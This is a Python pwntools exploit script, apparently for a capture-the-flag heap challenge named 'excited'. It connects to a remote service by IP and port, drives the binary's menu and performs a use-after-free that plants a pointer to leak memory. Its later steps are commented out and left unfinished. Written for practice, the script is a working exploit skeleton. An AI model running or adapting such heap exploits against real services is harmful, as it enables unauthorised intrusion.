from pwn import *
context.log_level = 'debug'
prog = './excited'
elf = ELF(prog)
#p = process(prog)
#,env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF("../libc-2.23.so")
p = remote("123.56.85.29", 6484)

def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def add(size1, content1, size2, content2):
	p.sendlineafter("do :", '1')
	p.sendlineafter("ba's length : ", str(size1))
	p.sendafter("ba : ", content1)
	p.sendlineafter("na's length : ", str(size2))
	p.sendafter("na : ", content2)
def show(idx):
	p.sendlineafter("do :", '4')
	p.sendlineafter("ID : ", str(idx))
def free(idx):
	p.sendlineafter("do :", '3')
	p.sendlineafter("ID : ", str(idx))
def exp():
	add(0x20, 'aaa', 0x20, 'bbb')#0
	add(0x20, 'aaa', 0x20, 'bbb')#1
	free(0)
	free(1)
	add(0x10, p64(0x6020a8), 0x20, 'bbb')
	show(0)
	#add(0x20, 'aaa', 0x50, 'a')#3
	#add(0x20, 'aaa', 0x50, 'bbb')#4
	#add(0x20, 'aaa', 0x50, 'bbb')#5
	#add(0x20, 'aaa', 0x50, '')#6
	#dbg()


	'''
	log.info("libc.address ==> " + hex(libc.address))
	'''
	p.interactive()
if __name__ == '__main__':
	exp()
